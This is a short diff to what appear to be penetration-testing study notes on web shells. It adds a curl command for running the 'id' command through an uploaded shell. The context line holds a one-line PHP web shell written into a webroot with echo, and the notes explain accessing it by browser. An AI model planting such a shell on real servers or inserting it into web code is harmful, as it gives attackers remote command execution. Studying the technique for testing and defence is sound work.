@@ -46,7 +46,7 @@ echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
 - Can check directories for see which webroot is used and use `echo` to write the web shell
 - Once shell is uploaded it can be accessed via browser or through `curl`
 	- Type `http://SERVER_IP:PORT/shell.php?cmd=id` into url to access shell using the `id` cmd
-	- 
+	- `curl http://SERVER_IP:PORT/shell.php?cmd=id` to access shell through curl
 
 ## Default webroots
 |Web Server|Default Webroot|
